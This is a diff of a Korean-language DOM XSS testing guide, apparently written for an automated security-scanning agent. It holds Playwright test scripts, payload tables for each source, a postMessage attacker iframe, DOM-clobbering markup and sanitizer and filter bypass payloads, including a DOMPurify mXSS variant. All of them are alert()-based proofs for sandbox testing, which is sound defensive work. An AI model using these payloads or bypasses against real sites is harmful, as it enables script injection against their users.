@@ -1,98 +1,123 @@
-## Phase 2: 동적 테스트 (Playwright 전용)
+### Phase 2: 동적 테스트 (Playwright 전용)
 
-### 원칙: curl 사용 금지
+**원칙**: DOM XSS는 서버 미경유 — **curl 금지**, Playwright로만 검증.
 
-DOM XSS는 서버가 페이로드를 처리하지 않는다. curl로는 브라우저 JS가 실행되지 않으므로 DOM XSS를 재현할 수 없다. **Phase 2는 반드시 Playwright로만 수행한다.**
+**기본 페이로드:**
 
-curl로 테스트를 대체하거나, curl 응답에서 페이로드 반영 여부를 확인하는 것은 DOM XSS 검증 방법이 아니다. curl 결과로 "확인됨" 또는 "안전"을 판정하지 않는다.
+**Source별:**
 
-### 테스트 절차
+| Source | 페이로드 | 비고 |
+|---|---|---|
+| `location.hash` | `#<img src=x onerror=alert(document.domain)>` | URL 인코딩 불필요 (서버 미전송) |
+| `location.hash` (href sink) | `#javascript:alert(1)` | `<a href>` 또는 `location.href` sink |
+| `location.search` | `?q=<svg/onload=alert(1)>` | URL 인코딩 필요 |
+| `window.name` | `<img src=x onerror=alert(document.domain)>` | `window.open`/`evaluate`로 설정 |
+| `postMessage` | `{"type":"msg","data":"<img src=x onerror=alert(1)>"}` | origin 검증 누락 시 |
+| `localStorage`/`sessionStorage` | `<img src=x onerror=alert(1)>` | 선행 주입 후 페이지 재방문 (2차) |
+| `document.referrer` | 이전 페이지 URL에 `<img src=x onerror=alert(1)>` | referer 헤더 전달 |
+| `document.cookie` | cookie 값에 페이로드 | 다른 XSS/sub-domain 경유 |
+| `IndexedDB`/`localForage` | DB 저장값에 페이로드 | 선행 주입 후 |
+| `BroadcastChannel` | 채널 메시지에 페이로드 | 같은 origin 다른 탭 |
 
-**Step 1: Playwright 스크립트 작성**
-
-각 후보에 대해 아래 구조의 Playwright 스크립트를 작성한다:
-
+**Playwright 스크립트:**
 ```javascript
 const { chromium } = require('playwright');
-
 (async () => {
   const browser = await chromium.launch({ headless: true });
-  const context = await browser.newContext();
-  const page = await context.newPage();
+  const ctx = await browser.newContext();
+  await ctx.addCookies([{ name: 'SESSION', value: '<V>', domain: '<D>', path: '/' }]);
+  const page = await ctx.newPage();
 
-  let alertFired = false;
-  let alertMessage = '';
+  let fired = false, msg = '';
+  page.on('dialog', async d => { fired = true; msg = d.message(); await d.dismiss(); });
 
-  // alert/confirm/prompt 가로채기
-  page.on('dialog', async dialog => {
-    alertFired = true;
-    alertMessage = dialog.message();
-    await dialog.dismiss();
-  });
+  // location.hash
+  await page.goto('https://target/path#<img src=x onerror=alert(document.domain)>');
 
-  // 세션 쿠키 설정 (인증 필요 시)
-  await context.addCookies([
-    { name: 'SESSION', value: '<세션값>', domain: '<대상도메인>', path: '/' }
-  ]);
+  // window.name (별도 frame에서 설정)
+  // await page.evaluate(() => { window.name = '<img src=x onerror=alert(1)>'; });
+  // await page.goto('https://target/path');
 
-  // Source별 페이로드 삽입
-  // [location.hash 케이스]
-  await page.goto('https://<대상>/path#<페이로드>');
-
-  // [window.name 케이스]
-  // await page.evaluate(() => { window.name = '<페이로드>'; });
-  // await page.goto('https://<대상>/path');
+  // postMessage (origin 검증 우회)
+  // await page.goto('https://target/path');
+  // await page.evaluate(() => { window.postMessage('<img src=x onerror=alert(1)>', '*'); });
 
   await page.waitForTimeout(2000);
-
-  if (alertFired) {
-    console.log('XSS 확인됨:', alertMessage);
-  } else {
-    // DOM 직접 확인
-    const dangerous = await page.evaluate(() => {
-      return document.body.innerHTML.includes('<img src=x');
-    });
-    console.log('DOM 삽입 여부:', dangerous);
-  }
-
+  const domLeak = await page.evaluate(() =>
+    document.body.innerHTML.includes('<img src=x') ||
+    document.body.innerHTML.includes('onerror')
+  );
+  console.log('fired:', fired, 'msg:', msg, 'domLeak:', domLeak);
   await browser.close();
 })();
 ```
 
-**Step 2: 페이로드 선택**
-
-| Source 유형 | 기본 페이로드 | 비고 |
-|-------------|-------------|------|
-| location.hash | `#<img src=x onerror=alert(document.domain)>` | URL 인코딩 불필요 (hash는 서버로 안 감) |
-| location.hash (스크립트 직접) | `#javascript:alert(1)` | href Sink인 경우 |
-| window.name | `<img src=x onerror=alert(document.domain)>` | window.open 또는 evaluate로 설정 |
-| postMessage | `{"type":"msg","data":"<img src=x onerror=alert(1)>"}` | origin 검증 우회 포함 |
-| localStorage | `<img src=x onerror=alert(document.domain)>` | 선행 주입 후 페이지 재방문 |
-
-**Step 3: 실행 및 결과 확인**
-
-```bash
-node /tmp/dom_xss_test.js
+**postMessage origin 우회 (외부 origin 시뮬레이션):**
+```html
+<!-- attacker page -->
+<iframe src="https://target/page" id=f></iframe>
+<script>
+  document.getElementById('f').onload = () => {
+    f.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
+  };
+</script>
 ```
 
-**Step 4: 성공 기준**
+**Trusted Types 미적용 확인:**
+```javascript
+const response = await page.goto('https://target/');
+console.log('CSP:', response.headers()['content-security-policy']);
+// require-trusted-types-for 'script'가 없으면 TT 미적용
+```
 
-| 결과 | 판정 |
-|------|------|
-| `alert()` 발화 확인 | **확인됨** |
-| 페이로드가 이스케이프 없이 DOM에 삽입됨 (예: `innerHTML`에 `<img onerror=...>`) | **확인됨** |
-| 페이로드가 DOM에 삽입되지 않거나 이스케이프되어 삽입됨 | 안전 |
-| Playwright 실행 실패 (command not found, 설치 오류) | `[도구 한계]` → 메인 에이전트에 위임 |
-| 세션 필요 페이지에서 인증 실패 | `[정보 부족]` |
+**DOM clobbering:**
+```html
+<!-- HTML form/img element가 ID/name으로 글로벌 변수 덮어쓰기 -->
+<form name="config"><input id="api" value="https://attacker"></form>
+<!-- JS가 window.config.api를 신뢰하면 우회 -->
+```
 
 ---
 
-## 유의사항
+**우회 페이로드:**
 
-- **Playwright 실행 시도 없이 `[도구 한계]`로 표시하지 않는다.** 실제로 실행했으나 실패한 경우에만 허용된다.
-- **DOM 조작이 비동기로 발생하는 경우**: `page.waitForTimeout(2000)` 대신 `page.waitForSelector` 또는 `page.waitForFunction`으로 충분히 대기한다.
-- **postMessage Origin 검증 우회**: `targetOrigin` 검증이 없거나 `'*'`인 경우만 취약점으로 분류한다. 발신 origin을 확인하는 코드가 있으면 우회 가능 여부를 코드에서 확인한 뒤 판정한다.
-- **`javascript:` URI Sink**: `location.href = userInput`에서 userInput이 `javascript:alert(1)`로 시작할 수 있는 경우 취약점이다. Playwright로 해당 URL을 직접 방문하여 실행 여부를 확인한다.
-- **localStorage 경유 2차 공격**: localStorage Source는 다른 XSS가 선행돼야 주입 가능하므로, 독립적인 공격 경로가 아니다. 보고 시 "2차 공격 경로"임을 명시한다.
-- 모든 동적 테스트는 sandbox 도메인에서만 수행한다.
-- "확인됨"은 Playwright에서 alert 발화 또는 페이로드 DOM 삽입이 직접 확인된 경우에만 부여한다. 코드 분석만으로는 "후보"다.
+phase1 `## 우회 가능 패턴` (xss-scanner와 공유).
+
+| 방어 | 우회 |
+|---|---|
+| DOMPurify 호출 | 구버전 mXSS 변형 (`<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=alert(1)>`) |
+| `encodeURI`/`encodeURIComponent` | fragment는 encode 안 해도 location.hash로 들어감 |
+| origin 검증 (postMessage) | `'*'` 또는 origin substring match 우회 |
+| CSP `script-src` | `data:`, `unsafe-eval`, dangling scripts, JSONP endpoint, JS gadget |
+| 키워드 블랙리스트 | `<sCrIpT>`, `<scr<script>ipt>`, 이벤트 핸들러 변형 (`onpointerover`, `onfocus autofocus`, `onanimationstart`) |
+| Trusted Types 적용 | string sink 거부되나 `unsafe` policy 등록되면 우회 — policy 정의 점검 |
+
+**hash 페이로드 변형:**
+```
+#<svg/onload=alert(1)>                         (28자, script 차단 환경)
+#<img src=x onerror=alert(1)>                  (30자)
+#<details/open/ontoggle=alert(1)>              (33자)
+#javascript:alert(1)                           (href sink)
+#<style>@import 'data:,*{background:url(...)}' </style>  (CSS injection)
+```
+
+---
+
+**참고사항:**
+
+- DOM XSS는 서버 무경유 — curl 결과로 판정 절대 금지
+- hash sink가 가장 빈번 — `location.hash`, `window.location.hash`
+- `eval`, `Function()`, `setTimeout(문자열)`, `setInterval(문자열)` sink는 직접 JS 실행
+- `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, jQuery `.html()` sink는 HTML 파싱
+- `location.href = userInput`에서 `javascript:` 스킴 허용 시 XSS — href sink별도
+- localStorage Source는 2차 공격 경로 — 독립적 공격 아님 (다른 XSS 선행 필요)
+- postMessage `targetOrigin: '*'`는 누구나 수신 — origin 체크 필수
+- Shadow DOM / iframe 내부 sink는 parent context와 분리 — 별도 점검
+- Trusted Types 정책 (`require-trusted-types-for 'script'`) 있으면 string sink 거부
+- DOM clobbering은 별도 — `<img name="attributes">` 같은 ID/name 충돌 공격
+- sandbox 도메인 한정 테스트 — prod 금지
+- Playwright 실행 시도 없이 `[도구 한계]`로 표시 금지 — 실제 실행 후 실패한 경우만
+- `page.waitForTimeout(2000)` 대신 `page.waitForSelector`/`page.waitForFunction`으로 충분히 대기
+- alert/confirm/prompt 모두 `dialog` 이벤트로 캐치 가능
+- DOM 삽입만 확인되고 실행 안 되어도 후보 — sink 도달 자체가 위험
+- Service Worker / SharedWorker postMessage source는 별도 frame에서 검증 필요
